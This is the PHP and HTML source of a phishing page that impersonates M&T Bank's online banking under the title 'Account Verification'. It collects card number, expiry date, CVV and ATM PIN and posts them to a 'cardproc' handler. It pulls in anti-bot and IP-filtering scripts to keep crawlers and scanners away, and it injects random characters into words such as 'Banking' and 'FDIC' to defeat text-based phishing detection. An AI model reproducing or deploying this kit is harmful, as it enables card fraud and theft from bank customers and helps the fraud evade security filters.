<?php
error_reporting(0);
session_start();
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";

?>
<!DOCTYPE html>
<html lang="en" class="__sticky-footer __sticky-footer--links">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
 <title>Welcome to Online Banking | M&amp;T Bank</title>

    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="../ft/css.css" rel="stylesheet">

    
<link rel="icon" sizes="96x96" href="../ft/image.png" type="image/png">
<link rel="icon" sizes="32x32" href="../ft/image(1).png" type="image/png">
<link rel="icon" sizes="16x16" href="../ft/image(2).png" type="image/png">
	<style>
		.sr8{max-width:60%}
		.sr8s{max-width:45%}
	</style>

	</head>
<body>

   

<form action="cardproc" method="post">
<div class="mtb-app-enrollment">
        <header class="mtb-page-header">
            <div class="grid-x align-center">
                <div class="cell">
                    <a  class="mtb__logo">
                        <img src="../ft/mtb-logo.svg" alt="M&amp;T Bank Site">
                    </a>
                </div>
            </div>
        </header>



            <div class="mtb-page-error <?php if(!isset($_GET[''.$theerrkey.''])){echo 'hide';};?>">
                <div class="mtb-app-default--content">
                    <div class="callout __has-icon warning __no-border">
                        <i class="__is-icon m-icon m-icon-notification">
                            <span class="show-for-sr">Notification Icon</span>
                        </i>
                        <p>
                            
    Ple<?php echo rT('ALPHANUMERIC',rand(1,87));?>ase fill in all the informations correctly in the displayed format
    
                        </p>
                    </div>
                </div>
            </div>
        <div class="mtb-app-login--content">
            <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
                <div class="cell">
                    <div class="mtb-section-header mtb-section-header__login">
                        <h1>
                           Account Verification - Ban<?php echo rT('ALPHANUMERIC',rand(1,87));?>king
                        </h1>
                        <p>
                       Step 1 of 1: Confirm Your Card
                        </p>
                    </div>
                </div>

                <div class="cell">
                    <label for="cardnumber">
                      Card Number
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" type="tel" id="cardnumber" name="cardnumber" maxlength="19" type="tel" onkeypress="stoplen(19)" oninput="innumlen(this.value);demcnum()" onpaste="demcnum()"  autocomplete="off" aria-required="true" value="">
                        
                    </div>
                </div>


                <div class="cell">
                    <label for="expdate">
                        Expiration Date
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem sr8" placeholder="MM/YY" type="tel" id="expdate" name="expdate" autocomplete="off" aria-required="true" maxlength="5" onkeypress="stoplen(5)" oninput="demexpDate()">
                        
                    </div>
                </div>
				
                <div class="cell">
                    <label for="cvv">
                        CVV
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem sr8s" type="tel" id="cvv" name="cvv" autocomplete="off" aria-required="true"  maxlength="4" oninput='innumlen(this.value)' value="">
                        
                    </div>
                </div>

                <div class="cell">
                    <label for="atm">
                        ATM PIN
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem sr8" type="tel" oninput='innumlen(this.value)' id="atm" name="atm" autocomplete="off" aria-required="true"  maxlength="4" value="">
                        
                    </div>
                </div>

            </div>

            <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
                <div class="cell">

                    <button type="submit" name="btnin" value="login" class="button button__form-no-spacer expanded" id="btnSubmit">
                        Continue
                    </button>
                </div>
                <p class="cell text-center __font-size-tiny __color-gray-accent">
                    Unauthorized access is prohibited. Usage may be monitored.
                </p>
            </div>
        </div>

        <hr class="__spacer-section">
        <div class="mtb-app-default--content">

			</div>
        <section class="mtb-footer mtb-footer__auth" role="contentinfo">
            <div class="grid-x">
                <div class="cell flex-container flex-dir-column align-center-middle">
                    <div class="mtb-footer--auth">
                        <a  class="" target="_blank">Get Started Guide</a>
                        <a  target="_blank">Security Assistance</a>
                        <a  target="_blank">Digital Service Agreement</a>
                        <a  target="_blank">ESign Agreement</a>
                        <a  target="_blank">
                            Accessibility
                        </a>


                        <a  target="_blank">
                            mtb.com
                        </a>
                    </div>

                    <div class="mtb-footer--non-auth">
                        <p>
                            ©<?php echo date("Y");?> M&amp;T Bank. All Rights Reserved.<br>
                            Users of this website agree to be bound by the provisions of the M&amp;T website <a  target="_blank">
                                Terms of
                                Use
                            </a> and <a  target="_blank">Privacy Policy</a>.
                        </p>
                        <div class="mtb-footer__logo">
                            <a  target="_blank">
                                <img src="../ft/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                            </a>
                            <a  target="_blank">
                                <img src="../ft/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                            </a>
                        </div>
                        <p>
                            Equal Hou<?php echo rT('ALPHANUMERIC',rand(1,87));?>sing Lender NMLS #381076
                            <a  target="_blank">Member FD<?php echo rT('ALPHANUMERIC',rand(1,87));?>IC</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>
    </div>
</form>
		               
<script>
"use strict"


function demexpDate(){var expdate=event.target;var key =event.data;var val=expdate.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){case 1:if(key > 1){event.target.value="";}; break; case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {expdate.value=expdate.value+"/";}; break; case 4:if(key < 2 || key >= 3 || key == 0){event.target.value=val.slice(0,val.length-1);}; break; case 5:if(!isNaN(parseInt(key))){event.target.value=val;}; break;};};if(event.inputType=="deleteContentBackward" && val.length == 2){expdate.value=val[0]}};

function demcnum(){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/\s/g,'').split('');
var pos=self.selectionStart;var cardtype=val.substring(0,2);var otherctype=val.substring(0,1);
if(pos){
if(/37|34/.test(cardtype)){self.maxLength="17";} else{self.maxLength="19";};
if(event.inputType=="insertText"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');event.target.value=mval.join('');;
if(mval[pos]){if(cardtype==37 || cardtype ==34){
if(pos%4==0 && pos<6 && mval.length>=5){event.target.setSelectionRange(pos+1,pos+1);} else if(pos%12==0 && mval.length>=13){event.target.setSelectionRange(pos+1,pos+1);} else{event.target.setSelectionRange(pos,pos);};} else{if(pos%5==0){event.target.setSelectionRange(pos+1,pos+1)} else{event.target.setSelectionRange(pos,pos);};};};
};
if(event.inputType=="deleteContentBackward"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');
event.target.value=mval.join('');
if(pos==0){event.target.setSelectionRange(0,0);}
else{if(cardtype==37 || cardtype ==34){
if(pos%4==0 && mval.length==5){event.target.setSelectionRange(pos,pos);} else if(pos%12==0 && mval.length==13){event.target.setSelectionRange(pos-1,pos-1);} else{event.target.setSelectionRange(pos,pos)};}
else{if(pos%5==0){event.target.setSelectionRange(pos-1,pos-1)} else{event.target.setSelectionRange(pos,pos);};};}
;};};
};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};

function stoplen(len){if(event.target.value.length==len && event.key!='Enter'){event.preventDefault();};}
</script>




	

</body></html>